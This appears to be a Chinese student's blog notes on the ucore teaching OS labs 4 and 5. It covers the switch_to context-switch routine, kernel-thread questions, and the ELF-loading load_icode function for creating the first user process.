+    movl %esi, 20(%eax)         #保存esi的值到context的esi
+    movl %edi, 24(%eax)         #保存edi的值到context的edi
+    movl %ebp, 28(%eax)         #保存ebp的值到context的ebp
+
+    # restore to&#39;s registers
+    movl 4(%esp), %eax          #保存to的首地址到eax
+    movl 28(%eax), %ebp         #保存context的ebp到ebp寄存器
+    movl 24(%eax), %edi         #保存context的ebp到ebp寄存器
+    movl 20(%eax), %esi         #保存context的esi到esi寄存器
+    movl 16(%eax), %edx         #保存context的edx到edx寄存器
+    movl 12(%eax), %ecx         #保存context的ecx到ecx寄存器
+    movl 8(%eax), %ebx          #保存context的ebx到ebx寄存器
+    movl 4(%eax), %esp          #保存context的esp到esp寄存器
+    pushl 0(%eax)               #将context的eip压入栈中
+    ret</code></pre>
+<p>switch_to函数主要完成的是进程的上下文切换，先保存当前寄存器的值，然后再将下一进程的上下文信息保存到对于寄存器中。</p>
+<p>问题1：在本实验的执行过程中，创建且运行了几个内核线程？</p>
+<p>答：创建了两个内核线程。idleproc是第一个内核线程，完成内核中各个子系统的初始化操作，然后立即调度，执行其他进程，等空闲后才创建第二个内核线程init_main。initproc是用于完成实验的功能而调度的内核线程。</p>
+<p>问题2：local_intr_save(intr_flag);….local_intr_restore(intr_flag);语句的作用？</p>
+<p>答：用于屏蔽中断和打开中断，以免进程切换时其他进程再进行调度。</p>
+<h2 id="5-lab5："><a href="#5-lab5：" class="headerlink" title="5. lab5："></a>5. lab5：</h2><p>实验目的：了解第一个用户进程创建过程，系统调用框架的实现机制，以及ucore如何系统调用 sys_fork/sys_exec/ sys_wait 来进行进程管理。</p>
+<p>之前的lab4还只是在内核态中，lab5我们将创建用户进程，让用户进程在用户态执行，且在需要ucore支持时，可通过系统调用来让ucore提供服务。</p>
+<p>实验执行流程：</p>
+<p>ucore要提供用户态进程的创建和执行机制，给应用程序执行提供一个用户态运行环境。</p>
+<p>初始化的总控函数kern_init将不会发生任何变化。</p>
+<p>在内存管理部分，与lab4最大的区别就是增加用户态虚拟内存的管理。为了管理用户态的虚拟内存，需要对页表的内容进行扩展，能够<code>把部分物理内存映射为用户态虚拟内存</code>。如果某进程执行过程中，CPU在用户态下执行（在CS段寄存器最低两位包含有一个2位的优先级域，如果为0，表示CPU运行在特权态；如果为3，表示CPU运行在用户态。），则可以访问本进程页表描述的用户态虚拟内存，但由于权限不够，不能访问内核态虚拟内存。另一方面，不同的进程有各自的页表，所以即使不同进程的用户态虚拟地址相同，但由于页表把虚拟页映射到了不同的物理页帧，所以不同进程的虚拟内存空间是被隔离开的，相互之间无法直接访问。在用户态内存空间和内核态内核空间之间需要拷贝数据，让CPU处在内核态才能完成对用户空间的读或写，为此需要设计专门的拷贝函数（copy_from_user和copy_to_user）完成。但反之则会导致违反CPU的权限管理，导致内存访问异常。</p>
+<p>在进程管理方面，主要涉及到的是进程控制块中与内存管理相关的部分，包括建立进程的页表和维护进程可访问空间（可能还没有建立虚实映射关系）的信息；加载一个ELF格式的程序到进程控制块管理的内存中的方法；在进程复制（fork）过程中，把父进程的内存空间拷贝到子进程内存空间的技术。另外一部分与用户态进程生命周期管理相关，包括让进程放弃CPU而睡眠等待某事件；让父进程等待子进程结束；一个进程杀死另一个进程；给进程发消息；建立进程的血缘关系链表。</p>
+<p>当实现了上述内存管理和进程管理的需求后，接下来ucore的用户进程管理工作就比较简单了。</p>
+<p>首先，“硬”构造出第一个进程（lab4中已有描述）idleProc，它是后续所有进程的祖先；然后，在proc_init函数中，通过alloc把当前ucore的执行环境转变成idle内核线程的执行现场；然后调用kernl_thread来创建第二个内核线程init_main，而init_main内核线程又创建了<code>user_main内核线程</code>。到此内核线程创建完毕。应该开始用户进程的创建过程，这第一步实际上是通过user_main函数调用kernel_tread创建子进程，通过kernel_execve调用来把某一具体程序的执行内容放入内存。具体的放置方式是根据ld在此文件上的地址分配为基本原则，把程序的不同部分放到某进程的用户空间中，从而通过此进程来完成程序描述的任务。一旦执行了这一程序对应的进程，就会从内核态切换到用户态继续执行。以此类推，CPU在用户空间执行的用户进程，其地址空间不会被其他用户的进程影响，但由于系统调用（用户进程直接获得操作系统服务的唯一通道）、外设中断和异常中断的会随时产生，从而间接推动了用户进程实现用户态到到内核态的切换工作。ucore对CPU内核态与用户态的切换过程需要比较仔细地分析（这其实是实验一的扩展练习）。当进程执行结束后，需回收进程占用和没消耗完毕的设备整个过程，且为新的创建进程请求提供服务。在本实验中，当系统中存在多个进程或内核线程时，ucore采用了一种FIFO的很简单的调度方法来管理每个进程占用CPU的时间和频度等。在ucore运行过程中，由于调度、时间中断、系统调用等原因，使得进程会进行切换、创建、睡眠、等待、发消息等各种不同的操作，周而复始，生生不息。</p>
+<h3 id="5-0-练习0："><a href="#5-0-练习0：" class="headerlink" title="5.0 练习0："></a>5.0 练习0：</h3><p>填写已有的实验。这里需要在lab4基础上修改某处代码。比如：</p>
+<p>alloc_proc函数中需要新增两行代码：（PCB需要新增两个初始化的成员变量）</p>
+<pre><code class="c">proc-&gt;wait_state = 0; //初始化进程等待状态
+proc-&gt;cptr = proc-&gt;optr = proc-&gt;yptr = NULL; //指针初始化
+/*
+   指针             相对关系   
+proc-&gt;parent  (proc is children)
+proc-&gt;cptr    (proc is parent)  // proc-&gt;childern_ptr
+proc-&gt;optr    (proc is younger sibling)
+proc-&gt;yptr    (proc is older sibling)    
+*/</code></pre>
+<p>改进 do_fork函数：（在合适的地方新增两行）</p>
+<pre><code class="c">assert(current-&gt;wait_state == 0); //确保进程在等待 ，wait_state在alloc_proc中已初始化为0。
+set_links(proc); //设置进程链接</code></pre>
+<h3 id="5-1-练习1："><a href="#5-1-练习1：" class="headerlink" title="5.1 练习1："></a>5.1 练习1：</h3><p>加载应用程序并执行。</p>
+<p>do_execv函数调用load_icode（位于kern/process/proc.c中）来加载并解析一个处于内存中的ELF执行文件格式的应用程序，建立相应的用户内存空间来放置应用程序的代码段、数据段等，且要设置好proc_struct结构中的成员变量trapframe中的内容，确保在执行此进程后，能够从应用程序设定的起始执行地址开始执行。但必须要设置正确的trapframe内容。</p>
+<p>load_icode函数：</p>
+<pre><code class="c">static int
+load_icode(unsigned char *binary, size_t size) {
+    if (current-&gt;mm != NULL) { //当前进程的内存为空
+        panic(&quot;load_icode: current-&gt;mm must be empty.\n&quot;);
+    }
+
+    int ret = -E_NO_MEM; //记录返回错误信息：未分配内存
+    struct mm_struct *mm;
+    //(1) create a new mm for current process
+    if ((mm = mm_create()) == NULL) { //尝试分配内存
+        goto bad_mm; //分配失败，返回
+    }
+    //(2) create a new PDT, and mm-&gt;pgdir= kernel virtual addr of PDT
+    if (setup_pgdir(mm) != 0) { //申请一个页目录表所需的空间
+        goto bad_pgdir_cleanup_mm; //申请失败
+    }
+    //(3) copy TEXT/DATA section, build BSS parts in binary to memory space of process
+    struct Page *page;
+    //(3.1) get the file header of the bianry program (ELF format)
+    struct elfhdr *elf = (struct elfhdr *)binary;
+    //(3.2) get the entry of the program section headers of the bianry program (ELF format)
+    struct proghdr *ph = (struct proghdr *)(binary + elf-&gt;e_phoff); //获取段头部表的地址
+    //(3.3) This program is valid?
+    if (elf-&gt;e_magic != ELF_MAGIC) { //读取的ELF文件不合法
+        ret = -E_INVAL_ELF; //ELF文件不合法错误
+        goto bad_elf_cleanup_pgdir; //返回
+    }
+
+    uint32_t vm_flags, perm; 
+    struct proghdr *ph_end = ph + elf-&gt;e_phnum;//段入口数目
+    for (; ph &lt; ph_end; ph ++) { //遍历每一个程序段
+    //(3.4) find every program section headers
+        if (ph-&gt;p_type != ELF_PT_LOAD) { //当前段不能被加载
+            continue ; //continue
+        }
+        //虚拟地址空间大小大于分配的物理地址空间
+        if (ph-&gt;p_filesz &gt; ph-&gt;p_memsz) { 
+            ret = -E_INVAL_ELF; 
+            goto bad_cleanup_mmap;
+        }
+        if (ph-&gt;p_filesz == 0) { //当前段大小为0
+            continue ;
+        }
+    //(3.5) call mm_map fun to setup the new vma ( ph-&gt;p_va, ph-&gt;p_memsz)
+        vm_flags = 0, perm = PTE_U;
+        if (ph-&gt;p_flags &amp; ELF_PF_X) vm_flags |= VM_EXEC;
+        if (ph-&gt;p_flags &amp; ELF_PF_W) vm_flags |= VM_WRITE;
+        if (ph-&gt;p_flags &amp; ELF_PF_R) vm_flags |= VM_READ;
+        if (vm_flags &amp; VM_WRITE) perm |= PTE_W;
+        if ((ret = mm_map(mm, ph-&gt;p_va, ph-&gt;p_memsz, vm_flags, NULL)) != 0) {
+            goto bad_cleanup_mmap;
+        }
+        unsigned char *from = binary + ph-&gt;p_offset;
+        size_t off, size;
+        uintptr_t start = ph-&gt;p_va, end, la = ROUNDDOWN(start, PGSIZE);
+
+        ret = -E_NO_MEM;
+
+     //(3.6) alloc memory, and  copy the contents of every program section (from, from+end) to process&#39;s memory (la, la+end)
+        end = ph-&gt;p_va + ph-&gt;p_filesz;
+     //(3.6.1) copy TEXT/DATA section of bianry program
+        while (start &lt; end) {
+            if ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == NULL) {
+                goto bad_cleanup_mmap;
+            }
+            off = start - la, size = PGSIZE - off, la += PGSIZE;
+            if (end &lt; la) {
+                size -= la - end;
+            }
+            memcpy(page2kva(page) + off, from, size);
+            start += size, from += size;
+        }
+
+      //(3.6.2) build BSS section of binary program
+        end = ph-&gt;p_va + ph-&gt;p_memsz;
+        if (start &lt; la) {
+            /* ph-&gt;p_memsz == ph-&gt;p_filesz */
+            if (start == end) {
+                continue ;
+            }
+            off = start + PGSIZE - la, size = PGSIZE - off;
+            if (end &lt; la) {
+                size -= la - end;
+            }
+            memset(page2kva(page) + off, 0, size);
+            start += size;
+            assert((end &lt; la &amp;&amp; start == end) || (end &gt;= la &amp;&amp; start == la));
+        }
+        while (start &lt; end) {
+            if ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == NULL) {
+                goto bad_cleanup_mmap;
+            }
+            off = start - la, size = PGSIZE - off, la += PGSIZE;
+            if (end &lt; la) {
+                size -= la - end;
+            }
+            memset(page2kva(page) + off, 0, size);
+            start += size;
+        }
+    }
+    //(4) build user stack memory
+    vm_flags = VM_READ | VM_WRITE | VM_STACK;
+    if ((ret = mm_map(mm, USTACKTOP - USTACKSIZE, USTACKSIZE, vm_flags, NULL)) != 0) {
+        goto bad_cleanup_mmap;
+    }
+    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-PGSIZE , PTE_USER) != NULL);
+    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-2*PGSIZE , PTE_USER) != NULL);
+    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-3*PGSIZE , PTE_USER) != NULL);
+    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-4*PGSIZE , PTE_USER) != NULL);
+
+    //(5) set current process&#39;s mm, sr3, and set CR3 reg = physical addr of Page Directory
+    mm_count_inc(mm);
+    current-&gt;mm = mm;
+    current-&gt;cr3 = PADDR(mm-&gt;pgdir);
+    lcr3(PADDR(mm-&gt;pgdir));
+
+    //(6) setup trapframe for user environment
+    struct trapframe *tf = current-&gt;tf;
+    memset(tf, 0, sizeof(struct trapframe));
+    tf-&gt;tf_cs = USER_CS;
+    tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS;
+    tf-&gt;tf_esp = USTACKTOP;
+    tf-&gt;tf_eip = elf-&gt;e_entry;
+    tf-&gt;tf_eflags = FL_IF;
+    ret = 0;
+out:
+    return ret;
+bad_cleanup_mmap:
+    exit_mmap(mm);
+bad_elf_cleanup_pgdir:
+    put_pgdir(mm);
+bad_pgdir_cleanup_mm:
+    mm_destroy(mm);
+bad_mm:
+    goto out;
+}</code></pre>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>明天继续，晚上又去跑步了。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
